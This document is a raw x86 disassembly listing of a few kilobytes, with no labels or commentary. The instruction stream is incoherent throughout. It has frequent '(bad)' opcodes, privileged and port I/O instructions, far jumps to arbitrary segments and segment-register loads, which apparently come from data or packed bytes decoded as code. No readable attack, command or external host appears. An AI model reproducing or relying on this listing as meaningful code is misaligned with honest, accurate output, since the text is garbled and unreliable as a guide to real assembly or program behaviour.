  412a0b:	mov    edi,0x3e4a6b53
  412a10:	dec    edx
  412a11:	call   FWORD PTR [edi]
  412a13:	dec    ebx
  412a14:	and    BYTE PTR [ebx+0x56],ch
  412a17:	add    bh,BYTE PTR [ecx+0x24]
  412a1a:	jge    0x412a73
  412a1c:	mov    dl,0x81
  412a1e:	iretw  
  412a20:	cli    
  412a21:	mov    esp,0xfa698548
  412a26:	(bad)  
  412a27:	cmc    
  412a28:	and    edx,DWORD PTR [edi-0x12a0e7b3]
  412a2e:	xor    bl,cl
  412a30:	rcl    BYTE PTR [ecx+0xe284166],0x31
  412a37:	(bad)  
  412a38:	inc    ebp
  412a39:	sti    
  412a3a:	rcr    BYTE PTR [ebp+0x51776ae0],0xe5
  412a41:	cwde   
  412a42:	icebp  
  412a43:	sub    BYTE PTR [ebp-0x48],0x7b
  412a47:	jmp    0x45c5519f
  412a4c:	(bad)  
  412a4d:	pop    edi
  412a4e:	inc    esi
  412a4f:	add    cl,BYTE PTR [edx]
  412a51:	imul   ebp,DWORD PTR [edx-0x14650b7c],0xffffffc2
  412a58:	pop    esi
  412a59:	dec    edx
  412a5a:	dec    eax
  412a5b:	rol    DWORD PTR [eax+0x1],1
  412a5e:	xlat   BYTE PTR ds:[ebx]
  412a5f:	cdq    
  412a60:	aaa    
  412a61:	ror    BYTE PTR [edx],1
  412a63:	push   ebp
  412a64:	ret    0xf075
  412a67:	int3   
  412a68:	jo     0x412a17
  412a6a:	xchg   edx,eax
  412a6b:	fisttp QWORD PTR [edi+0x1187f4e9]
  412a71:	ds into 
  412a73:	fdivr  st(5),st
  412a75:	push   0xffffffa5
  412a77:	fild   WORD PTR [esi-0xa]
  412a7a:	and    BYTE PTR [edx],cl
  412a7c:	adc    dl,BYTE PTR [edx]
  412a7e:	data16 jle 0x412ab9
  412a81:	(bad)  
  412a82:	mov    bh,0x4e
  412a84:	push   ebp
  412a85:	ret    
  412a86:	mov    al,ds:0x33a51719
  412a8b:	test   BYTE PTR [ebx],cl
  412a8d:	xchg   ecx,eax
  412a8e:	sbb    BYTE PTR [edx],dh
  412a90:	les    edi,FWORD PTR [ebp+0x79]
  412a93:	imul   ebp,DWORD PTR [edi],0xffffff9e
  412a96:	pop    ss
  412a97:	xchg   ebx,eax
  412a98:	mov    DWORD PTR ds:0x6b4a9ecf,esi
  412a9e:	xor    al,0x63
  412aa0:	jg     0x412a8f
  412aa2:	aas    
  412aa3:	out    0x77,eax
  412aa5:	xchg   ebx,eax
  412aa6:	out    0x7f,al
  412aa8:	cwde   
  412aa9:	cld    
  412aaa:	mov    cl,0x19
  412aac:	out    dx,eax
  412aad:	jns    0x412a97
  412aaf:	xchg   edx,eax
  412ab0:	mov    esp,0x536c6119
  412ab5:	push   ss
  412ab6:	dec    esi
  412ab7:	pmullw mm1,QWORD PTR [eax+0x6970be56]
  412abe:	fadd   st(6),st
  412ac0:	call   0x39f2:0x66bc81aa
  412ac7:	ficom  WORD PTR [edi-0x17]
  412aca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412acb:	mov    cl,0x73
  412acd:	mov    esp,0x6a41d8fe
  412ad2:	int3   
  412ad3:	pop    ecx
  412ad4:	jo     0x412a5c
  412ad6:	daa    
  412ad7:	inc    ebx
  412ad8:	pop    ebx
  412ad9:	cmp    BYTE PTR [esi+0x3b],ah
  412adc:	or     ebp,DWORD PTR [esi]
  412ade:	in     eax,0x4f
  412ae0:	shl    DWORD PTR [edx+edx*1],0x1b
  412ae4:	jae    0x412b36
  412ae6:	stos   BYTE PTR es:[edi],al
  412ae7:	pop    ebx
  412ae8:	(bad)  
  412ae9:	cmp    eax,DWORD PTR [ebx]
  412aeb:	outs   dx,BYTE PTR ds:[esi]
  412aec:	push   ebx
  412aed:	loop   0x412b03
  412aef:	sub    dl,BYTE PTR [eax+0x3c58c37e]
  412af5:	push   0x1b
  412af7:	frstor [ebp-0x2231ced8]
  412afd:	and    al,0x66
  412aff:	jo     0x412b3f
  412b01:	imul   edi,esi,0x1441a030
  412b07:	sbb    ebx,DWORD PTR [esi+0x6a0c3a94]
  412b0d:	mov    cs,eax
  412b0f:	pop    edi
  412b10:	dec    esp
  412b11:	lea    ecx,[edx-0x76faada3]
  412b17:	sub    ebp,DWORD PTR [ebx]
  412b19:	jae    0x412b2d
  412b1b:	sbb    ebp,edi
  412b1d:	jbe    0x412aaa
  412b1f:	jle    0x412ac9
  412b21:	out    0xfc,al
  412b23:	adc    BYTE PTR [edi],ch
  412b25:	addr16 jns 0x412afe
  412b28:	push   0x4a
  412b2a:	lods   eax,DWORD PTR ds:[esi]
  412b2b:	loop   0x412b56
  412b2d:	lds    edi,FWORD PTR [edi]
  412b2f:	sbb    DWORD PTR [ebx+0x523be796],esi
  412b35:	cmp    ah,BYTE PTR [esi]
  412b37:	cmp    DWORD PTR [esi+0x14b17966],edi
  412b3d:	xor    al,0x97
  412b3f:	es push esi
  412b41:	bnd call 0xb44a8f60
  412b47:	and    eax,0x8b119c9f
  412b4c:	push   ebx
  412b4d:	dec    edx
  412b4e:	inc    edx
  412b4f:	ins    BYTE PTR es:[edi],dx
  412b50:	mov    al,0xf4
  412b52:	jb     0x412b9e
  412b54:	pop    edx
  412b55:	imul   eax,DWORD PTR [eax*1+0xd17f7c4],0xce710e0d
  412b60:	ja     0x412b9b
  412b62:	mov    bl,0x33
  412b64:	xor    esp,DWORD PTR [esi]
  412b66:	dec    eax
  412b67:	int3   
  412b68:	jecxz  0x412b22
  412b6a:	stc    
  412b6b:	paddq  mm5,QWORD PTR [edx+0x65]
  412b6f:	nop
  412b70:	mov    ah,0xa3
  412b72:	je     0x412b01
  412b74:	frstor [esi+0x79]
  412b77:	fistp  DWORD PTR [edi+edi*8-0x4b]
  412b7b:	ret    0x9d46
  412b7e:	adc    BYTE PTR [ebx],bl
  412b80:	xor    BYTE PTR [esi],bl
  412b82:	and    ebx,ebx
  412b84:	addr16 loopne 0x412b15
  412b87:	add    eax,esi
  412b89:	or     ax,0x105a
  412b8d:	jmp    0xa958:0xfd6a19b9
  412b94:	xor    eax,0x2219dc2f
  412b99:	mov    bl,0x4f
  412b9b:	xchg   esp,eax
  412b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b9d:	cmp    BYTE PTR [edx+0x7c4b53f1],0xaf
  412ba4:	jmp    0x412c24
  412ba6:	neg    BYTE PTR [ebx]
  412ba8:	inc    eax
  412ba9:	push   0xffffffc5
  412bab:	test   al,0x3d
  412bad:	idiv   ebx
  412baf:	jg     0x412ba0
  412bb1:	(bad)  
  412bb2:	cmp    DWORD PTR [ecx],ebp
  412bb4:	mov    edx,0xb43318eb
  412bb9:	stc    
  412bba:	jns    0x412b42
  412bbc:	jae    0x412ba6
  412bbe:	mov    edx,0x6c323719
  412bc3:	arpl   bp,sp
  412bc5:	lds    esi,FWORD PTR [ebx]
  412bc7:	nop
  412bc8:	push   ebx
  412bc9:	pop    edi
  412bca:	mov    bh,0x1d
  412bcc:	inc    ebp
  412bcd:	sub    DWORD PTR [edx-0x40],ecx
  412bd0:	ds push 0xffffffa3
  412bd3:	neg    ebx
  412bd5:	or     cl,dh
  412bd7:	clc    
  412bd8:	push   0x38
  412bda:	data16 sbb al,0x79
  412bdd:	ret    
  412bde:	mov    dh,BYTE PTR [edi]
  412be0:	inc    eax
  412be1:	inc    ecx
  412be2:	arpl   WORD PTR [ebx],bx
  412be4:	imul   edi,DWORD PTR [edx+ebx*2+0x6c],0x1c336bf6
  412bec:	push   ebx
  412bed:	mov    dl,0x5c
  412bef:	pop    esp
  412bf0:	cwde   
  412bf1:	xchg   ecx,eax
  412bf2:	into   
  412bf3:	pop    eax
  412bf4:	aas    
  412bf5:	jne    0x412bf9
  412bf7:	daa    
  412bf8:	pop    ss
  412bf9:	push   ds
  412bfa:	lods   al,BYTE PTR ds:[esi]
  412bfb:	jl     0x412bd0
  412bfd:	mov    bl,0x9b
  412bff:	fld    DWORD PTR [esi-0x212199d8]
  412c05:	stos   BYTE PTR es:[edi],al
  412c06:	jo     0x412c84
  412c08:	jb     0x412bc4
  412c0a:	xor    bh,BYTE PTR [ebp+0x59c1b6fa]
  412c10:	or     ah,dh
  412c12:	jg     0x412c3b
  412c14:	inc    eax
  412c15:	jmp    FWORD PTR ds:0x296b2708
  412c1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c1c:	aaa    
  412c1d:	jnp    0x412bcd
  412c1f:	aad    0xe8
  412c21:	push   0x3d
  412c23:	in     eax,dx
  412c24:	add    eax,0x2694fcbe
  412c29:	pusha  
  412c2a:	jns    0x412c06
  412c2c:	pop    ebx
  412c2d:	xchg   edi,eax
  412c2e:	shl    DWORD PTR [esi],cl
  412c30:	cdq    
  412c31:	mov    cl,0x91
  412c33:	or     eax,0xb8c90f11
  412c38:	dec    esp
  412c39:	sub    eax,0x4b130adc
  412c3e:	push   cs
  412c3f:	push   ss
  412c40:	mov    dh,0x32
  412c42:	cmp    DWORD PTR [ecx-0x272b95b5],ebp
  412c48:	mov    al,0xb9
  412c4a:	jecxz  0x412c87
  412c4c:	cmp    ch,BYTE PTR [edx-0xf]
  412c4f:	add    eax,0x957ce2e1
  412c54:	mov    cl,0xd0
  412c56:	data16 rcr BYTE PTR [eax+edi*8],1
  412c5a:	xchg   esi,eax
  412c5b:	mov    dh,0x5e
  412c5d:	imul   ecx,DWORD PTR [esi],0x1b
  412c60:	mov    ch,0x22
  412c62:	pusha  
  412c63:	jne    0x412c50
  412c65:	ds fwait
  412c67:	cld    
  412c68:	push   edx
  412c69:	fs aas 
  412c6b:	ja     0x412c7b
  412c6d:	pop    ebp
  412c6e:	cmc    
  412c6f:	push   ebp
  412c70:	inc    edi
  412c71:	jnp    0x412ce4
  412c73:	sbb    eax,eax
  412c75:	inc    ecx
  412c76:	std    
  412c77:	fwait
  412c78:	mov    ds:0x5228fe2e,al
  412c7d:	test   al,0xed
  412c7f:	es xchg esi,eax
  412c81:	rcl    BYTE PTR [ecx+0x30],cl
  412c84:	daa    
  412c85:	pusha  
  412c86:	out    0x19,eax
  412c88:	stos   BYTE PTR es:[edi],al
  412c89:	adc    al,0x22
  412c8b:	inc    edi
  412c8c:	mov    bh,0x20
  412c8e:	icebp  
  412c8f:	push   ds
  412c90:	or     DWORD PTR ds:0x9e8679af,0xffffffbd
  412c97:	sbb    DWORD PTR [ebx+ebx*1+0x36079de2],edx
  412c9e:	in     al,dx
  412c9f:	jp     0x412cac
  412ca1:	je     0x412d1c
  412ca3:	inc    ebx
  412ca4:	push   esi
  412ca5:	pop    eax
  412ca6:	and    BYTE PTR [eax+ebx*1-0x2a55a2b5],0xf7
  412cae:	xchg   edx,eax
  412caf:	iret   
  412cb0:	scas   eax,DWORD PTR es:[edi]
  412cb1:	dec    esp
  412cb2:	rcr    DWORD PTR [ecx+0x676a00f0],cl
  412cb8:	test   DWORD PTR [ecx],edi
  412cba:	lods   al,BYTE PTR ds:[esi]
  412cbb:	cdq    
  412cbc:	data16 add ah,BYTE PTR [eax+0x47b79bea]
  412cc3:	sbb    BYTE PTR [edi],dh
  412cc5:	out    dx,eax
  412cc6:	cmp    BYTE PTR [ecx],ah
  412cc8:	jne    0x412d35
  412cca:	and    eax,0x67136dbf
  412ccf:	(bad)  
  412cd0:	push   ebp
  412cd1:	(bad)  
  412cd3:	cmp    ebx,edx
  412cd5:	sub    eax,0x6ac75c81
  412cda:	push   edx
  412cdb:	xchg   ebp,eax
  412cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cdd:	xchg   ebp,eax
  412cde:	pop    esi
  412cdf:	das    
  412ce0:	mov    al,ds:0x5361fbb7
  412ce5:	pop    esi
  412ce6:	(bad)  
  412ce7:	mov    dl,0x0
  412ce9:	or     eax,0x6ac63d4f
  412cee:	fist   DWORD PTR [eax]
  412cf0:	cli    
  412cf1:	call   FWORD PTR [ecx]
  412cf3:	sub    DWORD PTR [edx+0x4f],0xffffffe9
  412cf7:	and    DWORD PTR [ebp+0x16],0x51934cbc
  412cfe:	(bad)  
  412cff:	clc    
  412d00:	or     eax,0xfd184fda
  412d05:	jo     0x412c9e
  412d07:	cmp    esi,edi
  412d09:	xchg   BYTE PTR [edi+0x2b],bh
  412d0c:	push   ebx
  412d0d:	shl    bl,1
  412d0f:	inc    esp
  412d10:	fadd   st(5),st
  412d12:	nop
  412d13:	or     ch,0x16
  412d16:	xchg   edx,eax
  412d17:	sbb    esp,ebp
  412d19:	xchg   esi,eax
  412d1a:	(bad)  
  412d1b:	fld    TBYTE PTR [ebp+0x538ff760]
  412d21:	xchg   ecx,eax
  412d22:	jo     0x412cf7
  412d24:	pop    es
  412d25:	jbe    0x412da6
  412d27:	data16 cmp al,0x52
  412d2a:	jno    0x412cce
  412d2c:	rcl    DWORD PTR [edi],1
  412d2e:	cmp    ah,BYTE PTR [ebx+0x2f4b01eb]
  412d34:	push   ebp
  412d35:	adc    BYTE PTR [ebx+0x5d11df89],dh
  412d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d3c:	addr16 pop ebx
  412d3e:	xor    DWORD PTR [ebx+edx*2-0x45df8ab1],ecx
  412d45:	stos   BYTE PTR es:[edi],al
  412d46:	call   0xc302c85f
  412d4b:	mov    dl,0x3b
  412d4d:	xor    DWORD PTR [ebx-0x5988ac9b],eax
  412d53:	(bad)  
  412d54:	std    
  412d55:	test   DWORD PTR [ebp-0x5c],esi
  412d58:	pop    ecx
  412d59:	imul   edx,DWORD PTR [ebx],0x87671675
  412d5f:	mov    DWORD PTR [ebp+ebx*2+0x6037e57f],ecx
  412d66:	sbb    DWORD PTR es:[esi],esi
  412d69:	pop    esp
  412d6a:	xchg   edx,eax
  412d6b:	sbb    BYTE PTR ds:0xb4986b,ch
  412d71:	cmp    ah,BYTE PTR [ecx-0x3a]
  412d74:	adc    ebx,esp
  412d76:	dec    eax
  412d77:	add    al,dl
  412d79:	sbb    eax,0x188359e6
  412d7e:	mov    eax,0x8705dbc3
  412d83:	fstp   DWORD PTR [esi]
  412d85:	jae    0x412d5a
  412d87:	repnz push ebx
  412d89:	inc    edi
  412d8a:	int    0x5e
  412d8c:	xor    BYTE PTR [edx+0x4f],0xa4
  412d90:	daa    
  412d91:	ins    BYTE PTR es:[edi],dx
  412d92:	fisub  DWORD PTR [esi+0x332e443]
  412d98:	add    eax,0x8a9c468b
  412d9d:	hlt    
  412d9e:	sbb    eax,0xac414ad2
  412da3:	adc    eax,0xc026c003
  412da8:	imul   DWORD PTR [edx-0x22]
  412dab:	cld    
  412dac:	fadd   DWORD PTR [esi+edx*2+0x79b18da5]
  412db3:	or     bh,BYTE PTR [eax]
  412db5:	int    0x22
  412db7:	das    
  412db8:	pop    esp
  412db9:	mov    ebp,0x941119ad
  412dbe:	retf   0x80b8
  412dc1:	xlat   BYTE PTR ds:[ebx]
  412dc2:	(bad)
  412dc5:	mov    ch,BYTE PTR [eax-0x28]
  412dc8:	push   ebp
  412dc9:	enter  0xa814,0xd3
  412dcd:	sbb    DWORD PTR [ebx+edi*2+0x4],esp
  412dd1:	sub    BYTE PTR [edi+0x73],dl
  412dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dd5:	xor    DWORD PTR [edi-0x2217acea],edi
  412ddb:	stos   DWORD PTR es:[edi],eax
  412ddc:	jmp    0x412daa
  412dde:	in     al,dx
  412ddf:	in     al,dx
  412de0:	push   ebx
  412de1:	xchg   edx,eax
  412de2:	mov    BYTE PTR [ebx],ah
  412de4:	inc    eax
  412de5:	jmp    0x412e0e
  412de7:	jl     0x439e2ded
  412ded:	and    BYTE PTR [ecx+0x4b484499],ah
  412df3:	add    DWORD PTR [ebx-0x61],edx
  412df6:	dec    ebx
  412df7:	push   es
  412df8:	loope  0x412de5
  412dfa:	cmp    BYTE PTR [esi],dl
  412dfc:	xchg   ebx,eax
  412dfd:	imul   esp,DWORD PTR [ecx],0x4c6377ff
  412e03:	sub    BYTE PTR [esi+0x7b8d647f],dh
  412e09:	test   DWORD PTR [ebx+0x16b1ad61],0x370539dd
  412e13:	sbb    BYTE PTR [ecx-0x4945574],ch
  412e19:	loope  0x412e75
  412e1b:	rcl    DWORD PTR [eax+0x14],0x1b
  412e1f:	push   edi
  412e20:	jno    0x412e5f
  412e22:	add    DWORD PTR [ecx-0x4b],0x1219963c
  412e29:	xchg   ebx,eax
  412e2a:	cs cli 
  412e2c:	ins    BYTE PTR es:[edi],dx
  412e2d:	push   esi
  412e2e:	fbstp  TBYTE PTR [edi]
  412e30:	push   ebx
  412e31:	aam    0x9
  412e33:	adc    dh,BYTE PTR [edi-0x4c]
  412e36:	(bad)  
  412e37:	loopne 0x412dea
  412e39:	push   0x4b
  412e3b:	jp     0x412e3c
  412e3d:	pusha  
  412e3e:	mov    bl,0xaa
  412e40:	sub    DWORD PTR [edi-0x45ac1256],esp
  412e46:	hlt    
  412e47:	scas   eax,DWORD PTR es:[edi]
  412e48:	xchg   esp,eax
  412e49:	jne    0x412de7
  412e4b:	lods   al,BYTE PTR ds:[esi]
  412e4c:	cmp    ch,BYTE PTR [esi]
  412e4e:	sahf   
  412e4f:	addr16 int3 
  412e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e52:	cs add esp,ecx
  412e55:	jp     0x412e1a
  412e57:	fs int 0x54
  412e5a:	test   al,0x5c
  412e5c:	push   ebx
  412e5d:	out    dx,eax
  412e5e:	enter  0x55e,0x57
  412e62:	pop    ecx
  412e63:	push   ebx
  412e64:	cmp    ebp,DWORD PTR [edx+0x64]
  412e67:	mov    esp,0xfd7c153a
  412e6c:	in     eax,dx
  412e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e6e:	jns    0x412e23
  412e70:	mov    al,ds:0x27f304c1
  412e75:	pop    ds
  412e76:	mov    edx,esi
  412e78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e79:	sar    BYTE PTR [ebx-0x7bb12d15],1
  412e7f:	adc    ecx,esp
  412e81:	mov    bl,0x79
  412e83:	nop
  412e84:	loopne 0x412efa
  412e86:	and    ebx,DWORD PTR [eax]
  412e88:	dec    esp
  412e89:	mov    ebx,eax
  412e8b:	(bad)  
  412e8d:	cdq    
  412e8e:	lods   eax,DWORD PTR ds:[si]
  412e90:	mov    ah,0x90
  412e92:	in     eax,0xe
  412e94:	fwait
  412e95:	inc    ecx
  412e96:	and    ebx,DWORD PTR [edx+0x7b845f53]
  412e9c:	inc    ecx
  412e9d:	xor    BYTE PTR [ebp-0x4394f335],cl
  412ea3:	mov    WORD PTR [esi-0x3e],fs
  412ea6:	pop    ds
  412ea7:	xor    eax,0x9fd43d62
  412eac:	push   ebx
  412ead:	(bad)  
  412eae:	adc    eax,0xdabb3a61
  412eb3:	sbb    al,ch
  412eb5:	push   0xffffff9b
  412eb7:	jl     0x412ed4
  412eb9:	jge    0x412ec4
  412ebb:	test   BYTE PTR [esi],cl
  412ebd:	mov    bh,0xe0
  412ebf:	mov    dl,0x53
  412ec1:	xchg   ebx,eax
  412ec2:	ret    0xc290
  412ec5:	sub    eax,0xcac40bfe
  412eca:	fwait
  412ecb:	jp     0x412ed8
  412ecd:	imul   ecx,esi,0xffffffab
  412ed0:	or     BYTE PTR [edi+ecx*2+0x5a],dl
  412ed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ed5:	aam    0x46
  412ed7:	xor    BYTE PTR [ebx-0x28],dl
  412eda:	in     eax,dx
  412edb:	push   ecx
  412edc:	test   al,0xe3
  412ede:	cmp    BYTE PTR [edx+0xe],ah
  412ee1:	imul   esi,esp,0x36
  412ee4:	mov    bh,0xa0
  412ee6:	pusha  
  412ee7:	scas   al,BYTE PTR es:[edi]
  412ee8:	jmp    0x412eb2
  412eea:	data16 ficomp WORD PTR [ebp-0x7e]
  412eee:	dec    ebx
  412eef:	scas   eax,DWORD PTR es:[edi]
  412ef0:	jo     0x412edf
  412ef2:	fcom   st(4)
  412ef4:	dec    edi
  412ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ef6:	push   es
  412ef7:	push   ebx
  412ef8:	(bad)  
  412ef9:	in     al,dx
  412efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412efb:	push   edx
  412efc:	jg     0x412f4a
  412efe:	and    ebp,ecx
  412f00:	xchg   BYTE PTR [eax+0x62],ch
  412f03:	call   0xf213:0x390ed236
  412f0a:	(bad)  
  412f0b:	mov    ebx,0x7ab76ae0
  412f10:	push   ss
  412f11:	fstp   DWORD PTR [esp+ebx*8+0x12a9647b]
  412f18:	push   edi
  412f19:	cmp    al,0x3e
  412f1b:	enter  0x1f78,0x7a
  412f1f:	sbb    ebp,DWORD PTR [edi+0x6727095]
  412f25:	ins    BYTE PTR es:[edi],dx
  412f26:	or     al,0xc8
  412f28:	push   edx
  412f29:	lds    ebp,FWORD PTR [edi+0x246283f5]
  412f2f:	xor    DWORD PTR [ebx+ebp*4],esp
  412f32:	fs mov ebx,0x29d30205
  412f38:	(bad)  
  412f39:	mov    eax,ds:0x9270e993
  412f3e:	out    0x80,al
  412f40:	push   ebx
  412f41:	add    dh,BYTE PTR [ebx+0x36470749]
  412f47:	adc    esi,DWORD PTR [edx]
  412f49:	imul   ecx,ecx,0x2e
  412f4c:	jmp    0xd68b:0x71674e4d
  412f53:	push   0xf7425353
  412f58:	dec    esp
  412f59:	sbb    ebp,esi
  412f5b:	jb     0x412f0c
  412f5d:	imul   esp,DWORD PTR [edi-0x6235726a],0x663f2471
  412f67:	ja     0x412f39
  412f69:	xchg   BYTE PTR [edi-0x54],ch
  412f6c:	cld    
  412f6d:	mov    edi,0xc14e7d29
  412f73:	push   0xffffffc5
  412f75:	stos   BYTE PTR es:[edi],al
  412f76:	push   esi
  412f77:	xchg   BYTE PTR [esi+0x29],bh
  412f7a:	xor    ebx,DWORD PTR [ebp-0x672e93ad]
  412f80:	inc    esp
  412f81:	lea    edi,[esi+0x3349e1eb]
  412f87:	rol    esi,0xd8
  412f8a:	jno    0x412fdb
  412f8c:	xor    edi,DWORD PTR [edi+0x0]
  412f8f:	pop    ss
  412f90:	jmp    0xe3afacf2
  412f95:	xchg   esi,eax
  412f96:	add    bl,BYTE PTR [ebx+0x36a820ff]
  412f9c:	jo     0x413008
  412f9e:	stos   BYTE PTR es:[edi],al
  412f9f:	xchg   BYTE PTR [esi-0x266d2e7],dl
  412fa5:	mov    esi,0xfe50e0a5
  412faa:	in     al,0x27
  412fac:	das    
  412fad:	(bad)  
  412fae:	bound  ebx,QWORD PTR [ebx+0x19a66d24]
  412fb4:	push   ss
  412fb5:	lahf   
  412fb6:	aam    0x95
  412fb8:	ret    
  412fb9:	lea    edx,[ecx]
  412fbb:	push   ecx
  412fbc:	push   ebx
  412fbd:	cmp    al,0x7
  412fbf:	jg     0x412fa1
  412fc1:	loope  0x412fac
  412fc3:	stos   BYTE PTR es:[edi],al
  412fc4:	pop    eax
  412fc5:	mov    ds:0x7264abbe,eax
  412fca:	or     eax,0x62b873c9
  412fcf:	add    dl,bh
  412fd1:	or     ah,BYTE PTR [esi-0x44]
  412fd4:	dec    esp
  412fd5:	repnz lea esp,[edi]
  412fd8:	xchg   ecx,eax
  412fd9:	adc    cl,BYTE PTR [ebx-0x34]
  412fdc:	sub    al,0xaa
  412fde:	js     0x412ff8
  412fe0:	addr16 jbe 0x412fdd
  412fe3:	cmp    bl,BYTE PTR [ecx+0x53274285]
  412fe9:	in     eax,0x74
  412feb:	lea    ebx,ds:0x71ffbd7d
  412ff1:	imul   ebx,DWORD PTR [esi],0x7e37a86c
  412ff7:	dec    eax
  412ff8:	hlt    
  412ff9:	add    DWORD PTR [ecx+0x63],edi
  412ffc:	mov    al,ds:0x5edd503a
  413001:	jnp    0x41300b
  413003:	sbb    DWORD PTR [ebx+0x24842447],ecx
  413009:	jp     0x41301b
  41300b:	loopne 0x413060
  41300d:	mov    ebx,0x8ce86e9a
  413012:	cs push ds
  413014:	into   
  413015:	add    DWORD PTR [ecx-0x6fd263b2],edi
  41301b:	sub    DWORD PTR [edx+0x72],ebx
  41301e:	add    al,0x5d
  413020:	test   ch,dh
  413022:	fist   WORD PTR [esi-0x77]
  413025:	jle    0x413013
  413027:	cmp    ecx,DWORD PTR [eax+esi*8-0x5a]
  41302b:	ret    
  41302c:	mov    dl,0x4
  41302e:	out    0x6,eax
  413030:	mov    ecx,0xe22e1730
  413035:	jge    0x413066
  413037:	or     eax,0xcf1ee3d3
  41303c:	and    eax,0xb49d4b8d
  413041:	push   ebx
  413042:	fidivr DWORD PTR [ecx]
  413044:	lahf   
  413045:	and    DWORD PTR [ebx-0x5489439c],0x798ff0d8
  41304f:	(bad)  
  413050:	jmp    0x8632:0x1dcdb151
  413057:	push   edx
  413058:	fild   DWORD PTR [ecx]
  41305a:	jnp    0x413056
  41305c:	xchg   edx,eax
  41305d:	out    dx,eax
  41305e:	test   DWORD PTR [ecx],ebx
  413060:	push   ds
  413061:	pop    es
  413062:	pop    ds
  413063:	inc    ebp
  413064:	xor    ebp,DWORD PTR [ebx-0x38]
  413067:	sbb    DWORD PTR ss:[edi+0x7f],ecx
  41306b:	shr    BYTE PTR [esi+0x1b7b36d6],cl
  413071:	leave  
  413072:	sub    bh,BYTE PTR [edi+0x9cfeabc]
  413078:	xchg   esp,eax
  413079:	sbb    DWORD PTR [edi],0xd7008ca9
  41307f:	jecxz  0x4130c3
  413081:	shl    DWORD PTR [esi-0x5c391197],cl
  413087:	ds push ebx
  413089:	push   esi
  41308a:	sbb    eax,0x6ca64956
  41308f:	mov    ds,ebx
  413091:	push   0x35
  413093:	fdivr  QWORD PTR [eax]
  413095:	adc    edx,DWORD PTR [ebp+0x68]
  413098:	jae    0x41307b
  41309a:	data16 int3 
  41309c:	jl     0x4130af
  41309e:	jp     0x41304b
  4130a0:	gs push eax
  4130a2:	aad    0x18
  4130a4:	adc    ecx,esi
  4130a6:	rcl    dh,cl
  4130a8:	repz mov ds:0x6503ff19,eax
  4130ae:	mov    ecx,0x65987af9
  4130b3:	daa    
  4130b4:	(bad)  
  4130b5:	bound  edx,QWORD PTR [edx+0x13]
  4130b8:	ror    DWORD PTR [edx+0x6995526b],1
  4130be:	add    dh,dl
  4130c0:	call   0x9099e5fc
  4130c5:	(bad)  
  4130c6:	data16 rcl BYTE PTR [eax],1
  4130c9:	inc    edx
  4130ca:	inc    ebx
  4130cb:	dec    ebx
  4130cc:	xchg   esp,eax
  4130cd:	xor    DWORD PTR [ebp+0x18],eax
  4130d0:	push   edx
  4130d1:	mov    ebp,0x1fa1a4f3
  4130d6:	pop    eax
  4130d7:	(bad)  
  4130d8:	fwait
  4130d9:	sbb    dh,bh
  4130db:	aam    0xc
  4130dd:	shl    DWORD PTR [ebx-0x12acefb7],0x5f
  4130e4:	jbe    0x4130bf
  4130e6:	js     0x4130f8
  4130e8:	js     0x413153
  4130ea:	mov    bl,0xe9
  4130ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130ed:	mov    ecx,edi
  4130ef:	xchg   DWORD PTR [edi],ebp
  4130f1:	std    
  4130f2:	addr16 dec edi
  4130f4:	aam    0x21
  4130f6:	fcmovb st,st(6)
  4130f8:	or     ebp,DWORD PTR [eax]
  4130fa:	(bad)  
  4130fb:	shl    BYTE PTR [edx+edi*4+0x69],cl
  4130ff:	out    dx,eax
  413100:	repnz cmp DWORD PTR [esi-0x10],esp
  413104:	and    bl,BYTE PTR [edx-0x3a]
  413107:	mov    al,0x9d
  413109:	xchg   edi,eax
  41310a:	xchg   ebp,eax
  41310b:	test   DWORD PTR [eax],ecx
  41310d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41310e:	into   
  41310f:	shl    BYTE PTR [edi+0x18],1
  413112:	mov    al,ds:0x39aacbac
  413117:	or     BYTE PTR ds:0x9eb51a0c,0x2e
  41311e:	jno    0x4130fe
  413120:	jmp    0x413119
  413122:	scas   ax,WORD PTR es:[edi]
  413124:	add    BYTE PTR [esi+esi*4+0x3c84bad7],dl
  41312b:	jge    0x413108
  41312d:	mov    ch,0xb9
  41312f:	and    DWORD PTR [esi+edi*2],edi
  413132:	in     al,dx
  413133:	and    BYTE PTR [ebx-0x3c],bh
  413136:	outs   dx,BYTE PTR ds:[esi]
  413137:	add    al,0x53
  413139:	daa    
  41313a:	pop    ss
  41313b:	xchg   ebx,eax
  41313c:	sub    al,0x39
  41313e:	int    0xe8
  413140:	sub    DWORD PTR [ecx-0x6c],0x1530b426
  413147:	iret   
  413148:	or     eax,0x5fbc6f04
  41314d:	xor    dh,BYTE PTR [ebx]
  41314f:	out    dx,al
  413150:	or     eax,0xe1a6056b
  413155:	out    dx,eax
  413156:	ret    0xc1df
  413159:	push   0x23
  41315b:	retf   0x50d9
  41315e:	dec    ecx
  41315f:	popf   
  413160:	add    ecx,DWORD PTR [ebx]
  413162:	push   bp
  413164:	jnp    0x413199
  413166:	and    esp,DWORD PTR [esi+0x6d]
  413169:	jbe    0x41313b
  41316b:	sbb    DWORD PTR [ebp-0x3cb2d0],esp
  413171:	repz sbb ebp,DWORD PTR [eax]
  413174:	push   ebx
  413175:	(bad)  
  413176:	dec    ebx
  413177:	and    dl,BYTE PTR [esi*1+0x69a45dfc]
  41317e:	or     eax,0x27b5176b
  413183:	fld    DWORD PTR [ecx]
  413185:	jmp    0x8af53af0
  41318a:	cmp    dh,BYTE PTR [eax]
  41318c:	adc    ah,BYTE PTR [esi-0x66]
  41318f:	dec    ecx
  413190:	mov    gs,WORD PTR [ecx+0xd]
  413193:	pushf  
  413194:	xlat   BYTE PTR ds:[ebx]
  413195:	mov    ch,0xa2
